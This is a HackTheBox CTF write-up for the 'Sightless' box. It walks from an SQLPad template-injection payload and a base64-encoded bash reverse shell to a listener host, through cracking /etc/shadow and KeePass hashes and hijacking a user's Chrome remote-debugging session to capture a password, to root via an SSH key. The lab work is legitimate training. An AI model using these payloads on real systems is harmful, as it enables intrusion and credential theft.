---
title: Sightless
description: Find out how I rooted the box sightless from HackTheBox !
published: 2025-01-11
tags: [Linux,Easy,Web,HackTheBox,SqlPad,Chrome]
coverImage:
  src: '/public/images/sightless/hackthebox.png'
  alt: 'HackTheBox cover'
---


This box is an easy linux one, like many other ones on HackTheBox. However I think the priviliege escalation part was really interesting so I decided to share a write up for this box. As this is an easy linux one, it wont be too long.

Details :
It took my team and I ~2 hours to root it.

## Recon 
I'll start by running the default nmap scan : 
```shell title="zsh"
┌──(samsam㉿pika-pika)-[~/Downloads]
└─$ sudo nmap 10.129.190.84 -sCV -p- --min-rate 10000
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-08 00:55 CEST
Nmap scan report for sightless.htb (10.129.190.84)
Host is up (0.017s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (sightless.htb FTP Server) [::ffff:10.129.190.84]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 c9:6e:3b:8f:c6:03:29:05:e5:a0:ca:00:90:c9:5c:52 (ECDSA)
|_  256 9b:de:3a:27:77:3b:1b:e1:19:5f:16:11:be:70:e0:56 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Sightless.htb                                                                                          
|_http-server-header: nginx/1.18.0 (Ubuntu)                                                                          
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port21-TCP:V=7.94SVN%I=7%D=9/8%Time=66DCD9EE%P=x86_64-pc-linux-gnu%r(Ge                                                                   
SF:nericLines,A2,"220\x20ProFTPD\x20Server\x20\(sightless\.htb\x20FTP\x20S                                                                   
SF:erver\)\x20\[::ffff:10\.129\.190\.84\]\r\n500\x20Invalid\x20command:\x2                                                                   
SF:0try\x20being\x20more\x20creative\r\n500\x20Invalid\x20command:\x20try\                                                                   
SF:x20being\x20more\x20creative\r\n");                                                                                                       
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                   
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                              
Nmap done: 1 IP address (1 host up) scanned in 75.28 seconds
```
Nothing to unusual, I'll scan UDP if I get stuck, but we won't need it here.

## FTP
Trying to connect to ftp anonymously fails, but actually not because of the credentials :
```shell title="zsh"
┌──(samsam㉿pika-pika)-[~/Downloads]            
└─$ ftp 10.129.190.84                             
Connected to 10.129.190.84.                     
220 ProFTPD Server (sightless.htb FTP Server) [::ffff:10.129.190.84]    
Name (10.129.190.84:samsam): 550 SSL/TLS required on the control channel  
ftp: Login failed                                                      
ftp> 
```
If we google this we realize we need an ftp client that supports SSL encryption. `lftp` does just that : 
```shell title="zsh"
┌──(samsam㉿pika-pika)-[~/htb/sightless]
└─$ lftp -u a,a ftp://sightless.htb -e "set ssl:verify-certificate no"
lftp a@sightless.htb:~> ls
ls: Login failed: 530 Login incorrect.
lftp a@sightless.htb:~>
```
We'll need to come back whenever we have credentials for this service.

## Web
Port 80 is open, and as nmap said is delivering web content. Accessing it returns a redirect to `sightless.htb`. After adding it to my `/etc/hosts` file, let's access it with firefox :
![web.png](/images/sightless/web.png)
It's a really simple web page, none of the buttons work. I could try to bruteforce directories but this is not the way here. There's a link at the bottom mentionning a subdomain, `sqlpad.sightless.htb`.

## sqlpad.sightless.htb
Going to sqlpad.sightless.htb gives us access to a simple sqlpad interface : 
![sqlpad.png](/images/sightless/sqlpad.png)
This is the right time to keep in mind that this is an easy box. Where on an insane/hard, we would probably have to understand a lot about how sqlpad works, this is not the case here. In fact we are on google search away from getting a shell. The website displays `sqlpad version 6.10.0`. Googling sqlpad exploit leads to [this post](https://huntr.com/bounties/46630727-d923-4444-a421-537ecd63e7fb), which describes a vulnerability affecting all sqlpad instance for versions prior to 6.10.1. The payload is the following :
{% raw %}
```python
{{ process.mainModule.require('child_process').exec('id>/tmp/pwn') }}
```
{% endraw %}
To get a shell from it, I'll use the standard bash reverse shell, and base64 encode it to avoid bad characters :
`bash -i >& /dev/tcp/10.10.14.201/2222 0>&1`. My final payload is :
{% raw %}
```python
{{ process.mainModule.require('child_process').exec('echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMDEvMjIyMiAwPiYx |base64 -d|bash') }}
```
{% endraw %}
Now I follow the blog post describing the exploit, I create a new connection using the MySQL driver, and put my payload as the database :
![editconnectionsqlpad.png](/images/sightless/editconnectionsqlpad.png)
When I click on save, I do get a shell on my nc listener :
```shell title="zsh"
┌──(samsam㉿pika-pika)-[~/htb/sightless]
└─$ nc -lnvp 2222                   
Listening on 0.0.0.0 2222
Connection received on 10.129.98.24 42392
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@c184118df0a6:/var/lib/sqlpad#
```
As you can see we got a root shell from a container (which we can guest from the random hostname c184118df0a6). 

## User
Always enumerate a bit manually before running heavy tools like linpeas ! In this case another user is present in the container :
```shell title="zsh"
root@c184118df0a6:/# ls /home
michael  node
root@c184118df0a6:/# ls /home/michael
root@c184118df0a6:/#
```
Well two users, but I assume node is created for sqlpad. Since we are root we can access the hash of michael, in `/etc/shadow` !
```shell title="zsh"
root@c184118df0a6:/# grep michael /etc/shadow
michael:$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/:19860:0:99999:7:::
```
There are many many tutorials on [how to brute force linux passwords](https://erev0s.com/blog/cracking-etcshadow-john/), and you can even ask chatgpt. Now I'll copy michael's shadow line in a file called `s`, and his passwd line in a file called `p`, then :
```shell title="zsh"
┌──(samsam㉿pika-pika)-[~/htb/sightless]
└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt       
Warning: detected hash type "sha512crypt", but the string is also recognized as "HMAC-SHA256"
Use the "--format=HMAC-SHA256" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
No password hashes left to crack (see FAQ)

┌──(samsam㉿pika-pika)-[~/htb/sightless]
└─$ john hash --show                                     
michael:insaneclownposse:1001:1001::/home/michael:/bin/bash

1 password hash cracked, 0 left
```
Since I've already cracked it I had to pass it `--show`, you wont have to do this if it's your first time cracking it.

We can try to connect to the host with these credentials, and it works !
```shell title="zsh"
┌──(samsam㉿pika-pika)-[~/htb/sightless]
└─$ sshpass -p insaneclownposse ssh michael@sightless.htb
Last login: Tue Sep  3 11:52:02 2024 from 10.10.14.23
michael@sightless:~$ cat user.txt 
b6b1f528799b649e259c3186d2932f4f
```
And boom `user.txt` :)

## John
We are not alone on the box, there is also john in `/home`. We can try to enumerate his processes : 
```shell title="zsh"
michael@sightless:~$ ls /home
john  michael                                                                                                                                
michael@sightless:~$ ps -u john -o cmd >out && cat out                                                                                       
CMD                                                                                                                                          
/bin/sh -c sleep 110 && /usr/bin/python3 /home/john/automation/administration.py                 
/bin/sh -c sleep 140 && /home/john/automation/healthcheck.sh                                                                                 
/usr/bin/python3 /home/john/automation/administration.py                                                                                     
/home/john/automation/chromedriver --port=37871                                                                                               
/opt/google/chrome/chrome --allow-pre-commit-input --disable-background-networking --disable-client-side-phishing-detection --disable-default-apps --disable-dev-shm-usage --disable-hang-monitor --disable-popup-blocking --disable-prompt-on-repost --disable-sync --enable-automation --enable-logging --headless --log-level=0 --no-first-run --no-sandbox --no-service-autorun --password-store=basic --remote-debugging-port=0 --test-type=webdriver --use-mock-keychain --user-data-dir=/tmp/.org.chromium.Chromium.3xsGRc data:, 
[...]
/bin/bash /home/john/automation/healthcheck.sh
sleep 60
```
As you can see john is running google-chrome with remote debugging enabled ! This is great because it allows us to interact with his session and see what he is doing. `--remote-debugging-port=0` means that chrome will use a random port, so first we need to find out which port is used. I'll list all open ports, and as explained in [this post](https://stackoverflow.com/questions/52783655/use-curl-with-chrome-remote-debugging), if I curl `json` it should return me output.
```shell title="zsh"
michael@sightless:~$ ss -tuln |awk '{print $1, $5}'
Netid Local
udp 127.0.0.53%lo:53
udp 0.0.0.0:68
tcp 127.0.0.53%lo:53
tcp 0.0.0.0:80
tcp 127.0.0.1:8080
tcp 0.0.0.0:22
tcp 127.0.0.1:3306
tcp 127.0.0.1:46013
tcp 127.0.0.1:3000
tcp 127.0.0.1:37871
tcp 127.0.0.1:38983
tcp 127.0.0.1:33060
tcp *:21
tcp [::]:22
michael@sightless:~$ curl http://127.0.0.1:46013/json
404: Page Not Found
michael@sightless:~$ curl http://127.0.0.1:37871/json
{"value":{"error":"unknown command","message":"unknown command: unknown command: json","stacktrace":"#0 0x559635347e43 \u003Cunknown>\n#1 0x5596350364e7 \u003Cunknown>\n#2 0x55963509d6b2 \u003Cunknown>\n#3 0x55963509d18f \u003Cunknown>\n#4 0x559635002a18 \u003Cunknown>\n#5 0x55963530c16b \u003Cunknown>\n#6 0x5596353100bb \u003Cunknown>\n#7 0x5596352f8281 \u003Cunknown>\n#8 0x559635310c22 \u003Cunknown>\n#9 0x5596352dd13f \u003Cunknown>\n#10 0x559635001027 \u003Cunknown>\n#11 0x7fa41f046d90 \u003Cunknown>\n"}}
michael@sightless:~$ curl http://127.0.0.1:38983/json
[ {
   "description": "",
   "devtoolsFrontendUrl": "/devtools/inspector.html?ws=127.0.0.1:38983/devtools/page/808BE4E06885A551AAB634E133D0410F",
   "id": "808BE4E06885A551AAB634E133D0410F",
   "title": "Froxlor",
   "type": "page",
   "url": "http://admin.sightless.htb:8080/index.php",
   "webSocketDebuggerUrl": "ws://127.0.0.1:38983/devtools/page/808BE4E06885A551AAB634E133D0410F"
} ]
```
Ports 46013 and 37871 returned some strange stuff, however 38983 returned the expected json ! We can interact with this chrome session by many different ways, one of which is the chrome developper tools. To find out what I could do with this remote debugging chrome browser that john runs, I used a lot of google and found [this tutorial](https://developer.chrome.com/docs/devtools/remote-debugging/local-server). 
I can actually have access to his browser in real time ! A lot of steps are incoming, so don't worry if it's not quite clear I'll sum it up at the end.
I'll install chrome on my machine first. Then, I need to be able to access the port 37871, which for now is only accessible from the machine sightless.htb. 

To get access to it, I'll use ssh to forward the port :
`ssh -L 7070:127.0.0.1:38983 michael@sightless.htb`
Now, the port 38983 of the box, listening only on 127.0.0.1, is accessible through the port 7070 of my machine ;)

I'll follow the previously linked tutorial and add a new target in chrome://inspect/#devices :
![chrom_add_config.png](/images/sightless/chrom_add_config.png)

Then, a new target appears, meaning that it worked :
![connect_chrome.png](/images/sightless/connect_chrome.png)
When clicking on inspect, I get a live view of john's browser !! 
![john_login.gif](/images/sightless/john_login.gif)


He is connecting to a froxlor instance, typing his username and password, then logs out after a few seconds. I absolutely love it, I've never seen something like that in a ctf. 
So going back to exploitation, since he is typing his password we can actually intercept it, in the inspect pane there is a network tab. I'll log the login request, and stop the recording to check what was sent :
![intercept.gif](/images/sightless/intercept.gif)
And we have the admin password,`ForlorfroxAdmin` for the webapp Froxlor ! 

To sum up what we have done :
We found out that john is running a remotely debuggable chrome instance. Of course we want to debug it. We first found out which port it was debuggable on ( 38983 ). Then we realized this port is only accessible locally. So I forwarded it to my machine using ssh. 
Then, using chrome, went into the developper tools to add a remote instance, and saw what john was doing. We then captured his login requests and got his credentials. 

## FTP ( again ?! )
John was accessing admin.sightless.htb:8080, which matches what we saw earlier when we checked out which ports were open. Now I can forward port 8080 to my machine, using the same steps we did earlier : 
`ssh -L 7070:127.0.0.1:8080 michael@sightless.htb`
Now if I open firefox and type in 127.0.0.1:7070 I'll have access to the froxlor instance running on port 8080 of sightless.htb. I now have the credentials and can log in the webapp. 
After digging around for a bit, in `Resources -> Domains` theres a new domain, `web1.sightless.htb`. Interestingly, clicking on the web1 username opens the admin pannel of that customer. The FTP tab on the left allows me to reset the ftp password !
![ftpreset.png](/images/sightless/ftpreset.png)
I'll just copy paste the password suggestion, hit save, and try to connect to the ftp server :
```shell title="zsh"
┌──(samsam㉿pika-pika)-[~/htb/sightless]
└─$ lftp -u web1,rkunebpZvH ftp://sightless.htb -e "set ssl:verify-certificate no"                                   
lftp web1@sightless.htb:~> ls
drwxr-xr-x   3 web1     web1         4096 May 17 03:17 goaccess
-rw-r--r--   1 web1     web1         8376 Mar 29 10:29 index.html
lftp web1@sightless.htb:/> ls goaccess/
drwxr-xr-x   2 web1     web1         4096 Aug  2 07:14 backup
lftp web1@sightless.htb:/> ls goaccess/backup
-rw-r--r--   1 web1     web1         5292 Aug  6 14:29 Database.kdb
lftp web1@sightless.htb:/> get goaccess/backup/Database.kdb 
5292 bytes transferred
```
It works ! we can download the Database.kdb backup file. 
I can try to open it using a keepass file viewer, like keepassxc, but it requires a password. 
I'll try to brute force it using johntheripper :
```shell title="zsh"
┌──(samsam㉿pika-pika)-[~/htb/sightless]
└─$ keepass2john Database.kdb > keepass_hash
Inlining Database.kdb

┌──(samsam㉿pika-pika)-[~/htb/sightless]
└─$ john keepass_hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 600000 for all loaded hashes
Cost 2 (version) is 1 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
bulldogs         (Database.kdb)     
1g 0:00:00:21 DONE (2024-09-08 13:49) 0.04737g/s 51.53p/s 51.53c/s 51.53C/s kucing..morena
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
The password is bulldogs. This is getting quite long for an easy box, but hey we are almost done !
I'll import it in `keepassxc`, making sure to use import file, because this is a .kdb file meaning it's using KeePass 1.X :
![keepass_import.png](/images/sightless/keepass_import.png)
The database only has one entry, Username : root Password : q6gnLTB74L132TMdFCpK However it doesn't work on ssh nor when I `su root`. 
An `id_rsa` file is attached, and I can save it !
![keepass_attachment.png](/images/sightless/keepass_attachment.png)
```shell title="zsh"
┌──(samsam㉿pika-pika)-[~/htb/sightless]
└─$ ssh root@sightless.htb -i id_rsa         
Load key "id_rsa": error in libcrypto
```
If we look closely at the id_rsa file, using xxd :
```shell title="zsh"
┌──(samsam㉿pika-pika)-[~/htb/sightless]
└─$ xxd id_rsa
[...]
00000d40: 3d0d 0a2d 2d2d 2d2d 454e 4420 4f50 454e  =..-----END OPEN
00000d50: 5353 4820 5052 4956 4154 4520 4b45 592d  SSH PRIVATE KEY-
00000d60: 2d2d 2d2d                                ----
```
It's highlighted in my terminal, here it's not, but the bytes `0d 0a` (the second and third bytes , right after the 3d) here are relevant because they are the newline characters in Windows file formats. 
However in linux it's not the case, we only use `0a`, which is `\n`. 
We need to strip all `0d` bytes from this file. This can be done using the tool `dos2unix`.
We also notice that the id_rsa file is missing an `\n` in the end, which we'll need to add to fix the format.
```shell title="zsh"
┌──(samsam㉿pika-pika)-[~/htb/sightless]
└─$ dos2unix id_rsa              
dos2unix: converting file id_rsa to Unix format...
┌──(samsam㉿pika-pika)-[~/htb/sightless]
└─$ echo "" >> id_rsa    
┌──(samsam㉿pika-pika)-[~/htb/sightless]
└─$ ssh root@sightless.htb -i id_rsa     
Last login: Sun Sep  8 12:21:57 2024 from 10.10.14.201
root@sightless:~# cat root.txt
6634430c7157e4c226f3841debe7e655
```
This last steps of the box were not beginner friendly as it required some really specific knowledge in the id_rsa file format and the discrepancies between windows and linux.
This chrome debug privesc was actually unintended and that makes it even cooler ^^.
The intended path used xss in log poisoning, the full intended path is available [here](https://0xdf.gitlab.io/2025/01/11/htb-sightless.html)
